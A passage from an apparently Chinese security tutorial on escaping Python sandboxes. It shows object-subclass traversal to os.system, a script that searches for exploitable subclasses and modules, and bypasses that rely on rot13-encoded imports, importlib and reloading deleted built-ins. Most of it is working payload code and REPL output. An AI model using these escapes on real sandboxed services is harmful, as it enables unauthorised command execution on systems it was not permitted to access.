class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">61</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">62</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">63</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">64</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">65</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">66</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">67</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">68</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">69</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">70</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">71</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">73</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">74</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">75</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">76</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">78</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>我们直接看下python2中的逻辑</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/warnings.py</span><br></pre></td></tr></table></figure><p>可以看到导入了3个包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> types</span><br></pre></td></tr></table></figure><p>然后再接着看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/linecache.py</span><br></pre></td></tr></table></figure><p>可以看到导入了2个包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><p>那么久可以构成了这个代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h4><p>首先去Python的GitHub主页，找到所有的模块列表：</p><ul><li>Python2.7：<a href="https://github.com/python/cpython/tree/2.7/Lib">https://github.com/python/cpython/tree/2.7/Lib</a></li><li>Python3.8：<a href="https://github.com/python/cpython/tree/3.8/Lib">https://github.com/python/cpython/tree/3.8/Lib</a></li></ul><p>通过脚本进行筛选，执行方式看代码注释</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2022-09-22 13:30:58</span></span><br><span class="line"><span class="comment"># @Author  : ascotbe (ascotbe@gmail.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://www.ascotbe.com/</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_name</span>(<span class="params">url</span>):</span><br><span class="line">    file_name=[]</span><br><span class="line">    file_name_txt=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a.json():</span><br><span class="line">        file_name.append(i[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        file_name_txt+=i[<span class="string">&#x27;name&#x27;</span>]+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;python.txt&quot;</span>,<span class="string">&quot;w&quot;</span>).write(file_name_txt)</span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;python.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        modules = f.readlines()</span><br><span class="line">    modules = [m.strip().replace(<span class="string">&#x27;.py&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> m <span class="keyword">in</span> modules]</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>]</span><br><span class="line">    all_targets = target_modules + target_functions</span><br><span class="line">    results = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> modules:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            module = <span class="built_in">__import__</span>(m)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR:&#x27;</span>, m)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">in</span> module.__dict__:</span><br><span class="line">                results[m.encode()].append(t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可利用模块数量为:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(results)))</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">        <span class="built_in">print</span>(k, v)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python2</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line">    <span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python3</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;sys&#x27;].version</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。</span></span><br><span class="line">    <span class="comment"># 先要进入().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__中找到__builtins__模块，然后执行后面的代码</span></span><br><span class="line">    <span class="comment"># ().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    version= <span class="built_in">str</span>(sys.version_info.major)+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(sys.version_info.minor)</span><br><span class="line">    url=<span class="string">&quot;https://api.github.com/repos/python/cpython/contents/Lib?ref=&quot;</span>+version</span><br><span class="line">    results = get_file_name(url)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span>:</span><br><span class="line">        python2(results)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        python3(results)</span><br></pre></td></tr></table></figure><h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="使用编码进行导入"><a href="#使用编码进行导入" class="headerlink" title="使用编码进行导入"></a>使用编码进行导入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="built_in">__import__</span>(<span class="string">&quot;codecs&quot;</span>).decode(<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;rot_13&#x27;</span>))  <span class="comment"># python3没有commands模块</span></span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="使用importlib库"><a href="#使用importlib库" class="headerlink" title="使用importlib库"></a>使用<strong>importlib</strong>库</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(importlib.import_module(<span class="string">&quot;codecs&quot;</span>).decode(<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="内置函数被删除"><a href="#内置函数被删除" class="headerlink" title="内置函数被删除"></a>内置函数被删除</h4><p>在python中不用引入直接使用的内置函数称为<strong>builtin</strong>函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p>在python3.x 版本中<code>__builtin__</code>变成了<code>builtins</code></p><p><code>__builtin__</code>和<code>builtins</code>在都需要import才可以用，但是<code>__builtins__</code>是内置的直接可以用</p></div><p>用<code>__builtin__</code>来举例子，因此<code>open()</code>、<code>int()</code>、<code>chr()</code>这些函数，就相当于</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtin__.<span class="built_in">open</span>()</span><br><span class="line">__builtin__.<span class="built_in">int</span>()</span><br><span class="line">__builtin__.<span class="built_in">chr</span>()</span><br></pre></td></tr></table></figure><p>如果我们把这些函数从<code>__builtin__</code>中删除，那么就不能够再直接使用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># python2</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.<span class="built_in">chr</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;chr&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;chr&#x27;</span></span><br></pre></td></tr></table></figure><p>众所周知<code>eval</code>、<code>exec</code>、<code>execfile</code>也是在<code>__builtin__</code>中的，所以删除就不能用了，但是我们可以使用重加载函数<code>reload()</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>reload</code>也是<code>__builtin__</code>下面的函数，如果直接把它干掉，就没办法重新引入了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.reload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;reload&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>直接使用<strong>imp</strong>模块，这样我们就重新得到完整的<code>__builtin__</code>模块了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>imp.reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><h4 id="部分模块被限制"><a href="#部分模块被限制" class="headerlink" title="部分模块被限制"></a>部分模块被限制</h4><p>服务器如果对Python的某些高风险模块如os进行了删除或修改权限设置，可能导致无法正常使用。但是sys没有限制，我们可以使用sys.modules来查看初始化就加载的模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules</span><br><span class="line">&#123;<span class="string">&#x27;copy_reg&#x27;</span>: &lt;module <span class="string">&#x27;copy_reg&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/copy_reg.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_compile&#x27;</span>: &lt;module <span class="string">&#x27;sre_compile&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_compile.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_sre&#x27;</span>: &lt;module <span class="string">&#x27;_sre&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings&#x27;</span>: &lt;module <span class="string">&#x27;encodings&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/__init__.pyc&#x27;</span>&gt;,</span><br><span 